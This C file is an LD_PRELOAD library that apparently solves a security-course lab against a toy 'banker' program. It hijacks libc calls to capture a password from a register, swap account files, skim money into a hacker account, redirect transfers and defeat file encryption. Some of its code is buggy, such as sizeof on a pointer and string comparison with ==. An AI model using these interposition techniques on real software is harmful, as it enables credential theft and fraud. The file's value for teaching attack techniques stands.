#include<stdint.h>
#include<stdio.h>
#include <stdlib.h>
#include<dlfcn.h>
#include<string.h>
#include<errno.h>
#include<execinfo.h>
#include<sys/types.h>
#include<unistd.h>
#include<stdarg.h>
#include <sys/mman.h>
#include<sys/wait.h>
#include<sys/stat.h>
//#include<fcntl.h>

/* We aren't providing much code here.  You'll need to implement quite a bit
 * for your library. */

/*
  Current part number - ./banker [part]
*/
int part = -1;

int part4_check = 1;

int part5_check = 1;
int current_account = 1;

/*
  Global variables for ./banker 7
*/
int ignore_encryption = 1;
char* current_filepath_1;
char* current_filepath_2;
char* current_filedescriptor_1;
char* current_filedescriptor_2;
int current_filedescriptor_check = 1;

char name[8][20];
char value[8][20];
int state = 0; //0 is fake open, 1 is real open
int fake_file_count = 0;




/*
  strtol interpositionn to invercept the current part from execve
*/
long int strtol(const char *str, char **endptr, int base){
  static long int (*real_strtol)(const char *, char**, int) = NULL;
  if (!real_strtol){
      real_strtol = dlsym(RTLD_NEXT, "strtol");
  }
  long int rc = real_strtol(str, endptr, base);
  part = rc;
  return rc;
}

/*
  Utility function for finding filename extension
  (Checked SO for this)
*/
const char *get_filename_ext(const char *filename) {
    const char *period = strrchr(filename, '.');
    if(!period || period == filename){
        return "";
    }
    return period + 1;
}

/*
  Used in part 7
  Writes to the orginal file without encryption
*/
void write_original(char *filename, char *str){
  ignore_encryption = 1;
  FILE* fp = fopen(filename, "w");
  fputs(str, fp);
  fclose(fp);
  ignore_encryption = 0;
}

/*
  A really, really bad XOR encryption method
  (If data is already encrypted, it will decrypt it and return the original
  balance)
*/
char* encrypt_data(char* data, char* file_descriptor){
  for(int i = 0; i < strlen(data); i++){
    data[i] ^= file_descriptor[0];
  }
  return data;
}

/*
  An interpositoned version of fscanf to intercept the password for part 1
  and write it to stdin
*/

int fscanf(FILE *stream, const char *format, ...){
    static int (*real_fscanf)(FILE*, const char*, va_list) = NULL;
    if (!real_fscanf){
      	real_fscanf = dlsym(RTLD_NEXT, "vfscanf");
		}
    va_list ap;
    va_start(ap, format);
    register const char *r13 asm("r13");
    FILE* tmpf = tmpfile();
    dup2(fileno(tmpf), 0);
    fputs(r13, tmpf);
    rewind(tmpf);
    va_end(ap);

    int rc = real_fscanf(stream, format, ap);

    return rc;
}

/*
  An interpositioned version of fopen to open bob's file when alice's filename
  is passed and vice versa
*/
FILE* fopen(const char * filename, const char * mode){
   static FILE* (*real_fopen)(const char *, const char *) = NULL;
   if (!real_fopen){
       real_fopen = dlsym(RTLD_NEXT, "fopen");
   }
   char* alice_filename = "alice.data";
   char* bob_filename = "bob.data";
   FILE* rc;
   if(part == 2){
     if(!strcmp(filename, "bob.data")){
       rc = real_fopen(alice_filename, mode);
     }
     else{
       if(!strcmp(filename, "alice.data")){
         rc = real_fopen(bob_filename, mode);
       }
       else{
         rc = real_fopen(filename, mode);
       }
     }
   }
   else{
       rc = real_fopen(filename, mode);
   }
   return rc;
}

/*
  Utility function for 5 - checks to make sure the current account can fulfill
  a 10$ transaction
*/
void check_balance_utility(char* filename){
  FILE* account = fopen(filename, "r");
  int balance;
  char balance_buffer[1024];
  while(fgets(balance_buffer, sizeof balance_buffer, account) != NULL);
  balance = atoi(balance_buffer);
  if((balance / 10) < 1){
    current_account++;
  }
  fclose(account);
}

/*
  Utility function for 5 - depending on the global variable current_account,
  check_balance will open check_balance_utility with the corresponding file
  utility
*/
void check_balance(){
  switch(current_account){
    case 1:
    check_balance_utility("bob.data");
    break;
    case 2:
    check_balance_utility("alice.data");
    break;
    case 3:
    check_balance_utility("rick.data");
    break;
    case 4:
    check_balance_utility("morty.data");
    break;
    case 5:
    check_balance_utility("picard.data");
    break;
    case 6:
    check_balance_utility("kirk.data");
    break;
  }
}

/*
  An interpositoned version of random such that when part == 5, random will
  set the receiving account to always be the hacker and the sender to be
  an account to be ciphened from. When the balance of that account can no longer
  make a 10$ transaction, random will set the sender to be the next account that
  can fulfill a 10$ transaction.
*/
long int random(void){
  static long int (*real_random)(void) = NULL;
  if (!real_random){
      real_random = dlsym(RTLD_NEXT, "random");
  }
  long int rc;
  if(part == 5){
    if(part5_check){
      part5_check = 0;
      check_balance();
      return current_account;
    }
    else{
      part5_check = 1;
      rc = 0;
    }
  }
  else{
    rc = real_random();
  }
  return rc;
}


/*
  An interpositioned version of sprintf to
  1. (4) skim off money from the transaction value and pass it to the ahcker
  2. (7) write the new, unencrypted data to the original file
*/
int sprintf(char *str, const char *format, ...){
  static int (*real_sprintf)(char*, const char*, va_list) = NULL;
  if (!real_sprintf){
      real_sprintf = dlsym(RTLD_NEXT, "vsprintf");
  }
  va_list ap;
  va_start(ap, format);
  va_end(ap);
  int rc = real_sprintf(str, format, ap);

  FILE* hacker_pointer;
  if(part == 4){
    if(part4_check){
      part4_check = 0;
      int str_int = atoi(str) - 1;
      if(str_int > -1){
        sprintf(str, format, str_int);
        hacker_pointer = fopen("hacker.data", "r");
        char hacker_buffer[1024];
        while(fgets(hacker_buffer, sizeof hacker_buffer, hacker_pointer) != NULL);
        int hacker_balance = atoi(hacker_buffer);
        hacker_balance++;
        fclose(hacker_pointer);
        hacker_pointer = fopen("hacker.data", "w");
        fprintf(hacker_pointer, "%d", hacker_balance);
        fclose(hacker_pointer);
      }
    }
    else{
      part4_check = 1;
    }
  }
  else{
    if(part == 7){
      if(strncmp(get_filename_ext(str), "data", 4) && strncmp(get_filename_ext(str), "enc", 3)){
        if(current_filedescriptor_check){
          write_original(current_filepath_1, str);
          current_filedescriptor_check = 0;
        }
        else{
          write_original(current_filepath_2, str);
          current_filedescriptor_check = 1;
        }
      }
    }
  }
  return rc;
}

/*
  (7) Generates/checks the encrypted filename and encrypts the data within it
*/
char* encrypt_file(const char* filename){

  /*
    Creates encrypted filename - [filename].enc
  */
  int length = strlen(filename);
  char* file_descriptor;
  for(int i = 0; i < length; i++){
    if(filename[i] == '.'){
      file_descriptor = (char*)malloc((i)*sizeof(char));
      strncpy(file_descriptor, filename, i);
      file_descriptor[i] = '\0';
      break;
    }
  }

  char* buffer = malloc(sizeof(char) * (strlen(file_descriptor) + 4));
  sprintf(buffer, "%s.enc",file_descriptor);

  if(current_filedescriptor_check){
    current_filedescriptor_1 = file_descriptor;
  }
  else{
    current_filedescriptor_2 = file_descriptor;
  }

  /*
    If the original filename is a valid account (that is [filename].data exists)
    1. Get the data from the original
    2. Encrypt it
    3. Open a new [filename].enc for writing and write the encrypted data
  */
  if(access(filename, F_OK) == 0){
    FILE* orginal_file = fopen(filename, "r");
    char* orginal_buffer = malloc(sizeof(char) * 1024);
    while(fgets(orginal_buffer, sizeof orginal_buffer, orginal_file) != NULL);
    FILE* encrypted_file = fopen(buffer, "w");
    orginal_buffer = encrypt_data(orginal_buffer, file_descriptor);
    fputs(orginal_buffer, encrypted_file);
    fclose(encrypted_file);
    fclose(orginal_file);
  }
  return (char*)buffer;
}

/*
  (7) An interpositioned version of sscanf that takes an encrypted buffer and
  decrypts it before reading it
*/
int sscanf(const char *buffer, const char *format, ...)
{
   static int (*real_sscanf)(const char *, const char*, va_list) = NULL;
   if (!real_sscanf){
      real_sscanf = dlsym(RTLD_NEXT, "vsscanf");
  }
   va_list ap;
   va_start(ap, format);
   va_end(ap);
   int rc;
   char* decrypted_buffer = malloc(sizeof(buffer));
   if(part == 7){
     if(current_filedescriptor_check){
       current_filedescriptor_check = 0;
       decrypted_buffer = encrypt_data((char*)buffer, current_filedescriptor_1);
     }
     else{
       current_filedescriptor_check = 1;
       decrypted_buffer = encrypt_data((char*)buffer, current_filedescriptor_2);
     }
     rc = real_sscanf(decrypted_buffer, format, ap);
   }
   else{
     rc = real_sscanf(buffer, format, ap);
   }

   return rc;
}

/*
  An interpositioned version of open that if part = 7, the file that is
  encrypted is accessed as opposed to the regular .data file.
*/
int open(const char *path, int oflags, ...){
  static int (*real_open)(const char *, int, va_list) = NULL;
  if (!real_open){
      real_open = dlsym(RTLD_NEXT, "open");
  }
  int rc;
  char* encrypted_path;
  va_list ap;
  va_start(ap, oflags);
  va_arg(ap, mode_t);
  if(part == 7 && !ignore_encryption){
    if(current_filedescriptor_check){
      encrypted_path = encrypt_file(path);
      current_filedescriptor_check = 0;
      current_filepath_1 = (char*) path;
    }
    else{
      encrypted_path = encrypt_file(path);
      current_filedescriptor_check = 1;
      current_filepath_2 = (char*) path;
    }
    if(access(encrypted_path, F_OK) == 0){
      rc = real_open(encrypted_path, oflags, ap);
    }
    else{
      rc = real_open(path, oflags, ap);
    }
  }
  else {
    printf("%d\n", part);
    if(part == 3) {
      if(path == "3") {
        rc = real_open(path, oflags, ap);
      }
      else {
        //char read_buffer[20];
        //int fd = real_open(path, oflags, ap);
        //lseek(fd, 10, SEEK_SET);
        //read(fd, read_buffer, strlen(read_buffer));
        //close(fd);
        strcpy(name[fake_file_count], path);
        rc = fake_file_count;
        fake_file_count++;
      }
    }
    else{
      rc = real_open(path, oflags, ap);
    }
  }

  ignore_encryption = 0;
  return rc;
}

ssize_t read(int fildes, void *buf, size_t nbytes) {
  static int (*real_read)(int fildes, void *buf, size_t nbytes) = NULL;
  if (!real_read){
      real_read = dlsym(RTLD_NEXT, "read");
  }
  //int rc = real_read(fildes, buf, nbytes);
  strcpy(value[fildes], buf);
  return strlen(buf);
}


off_t lseek(int fildes, off_t offset, int whence) {
  static int (*real_lseek)(int fildes, off_t offset, int whence) = NULL;
  if (!real_lseek){
      real_lseek = dlsym(RTLD_NEXT, "lseek");
  }
  int rc;
  //int rc = real_lseek(fildes, offset, whence);
  if(state == 1) {
    rc = real_lseek(fildes, offset, whence);
  }
  else {
    //int rc = real_write(fildes, buf, nbytes);
    rc = 0;

  }
  return rc;

}

int ftruncate(int fd, off_t length) {
  static int (*real_ftruncate)(int fd, off_t length) = NULL;
  if (!real_ftruncate){
      real_ftruncate = dlsym(RTLD_NEXT, "ftruncate");
  }
  int rc;
  if(state == 1) {
    rc = real_ftruncate(fd, length);
  }
  else {
    //int rc = real_write(fildes, buf, nbytes);
    rc = 0;

  }
  return rc;
}


ssize_t write(int fildes, const void *buf, size_t nbytes) {
  static int (*real_write)(int fildes, const void *buf, size_t nbytes) = NULL;
  if (!real_write){
      real_write = dlsym(RTLD_NEXT, "write");
  }
  int rc;
  if(part == 3){
    if(state == 1) {
      rc = real_write(fildes, buf, nbytes);
    }
    else {
      //int rc = real_write(fildes, buf, nbytes);
      strcpy(value[fildes], buf);
      rc = strlen(buf);
    }
  } 
  else{
    rc = real_write(fildes, buf, nbytes);
  }

  return rc;
}

int close(int fildes) {
  static int (*real_close)(int fildes) = NULL;
  if (!real_close){
      real_close = dlsym(RTLD_NEXT, "close");
  }
  int rc;
  if(part == 3) {
    state = 1;
    open(name[fildes], 0x0002, S_IRWXU);
    ftruncate(fildes, 0);
    lseek(fildes, 0, SEEK_SET);
    write(fildes, value[fildes], strlen(value[fildes]));
    rc = real_close(fildes);
    state = 0;
  }
  else{
    rc = real_close(fildes);
  }

  return rc;
}



/*
  (8) interpositioned version of fork that waits for the child process to finish
  before spawing a new one.
*/
pid_t fork(void){
  static pid_t (*real_fork)(void) = NULL;
  if (!real_fork){
      real_fork = dlsym(RTLD_NEXT, "fork");
  }
  int status = 0;
  pid_t rc = real_fork();
  while(waitpid(-1, &status, WNOHANG | WUNTRACED) > 0);
  return rc;
}

/* Declarations for the functions in part2_hash.cc, so that we don't need an
 * extra header file. */
void malloc_insert(size_t size);
void malloc_dump();
void so_allocate();
void so_deallocate();

static int ignoreMalloc = 0;

void *malloc(size_t bytes)
{
	static void* (*origMalloc)(size_t) = NULL;
	if(!origMalloc)
	{
		origMalloc = (void* (*)(size_t))dlsym(RTLD_NEXT, "malloc");
	}

	if(ignoreMalloc)
	{
		return origMalloc(bytes);
	}

	ignoreMalloc = 1;
	malloc_insert(bytes);
	ignoreMalloc = 0;

	return origMalloc(bytes);
}


__attribute__((destructor))
static void deallocate()
{
	malloc_dump();
	so_deallocate();
}


__attribute__((constructor))
static void allocate()
{
	so_allocate();
}
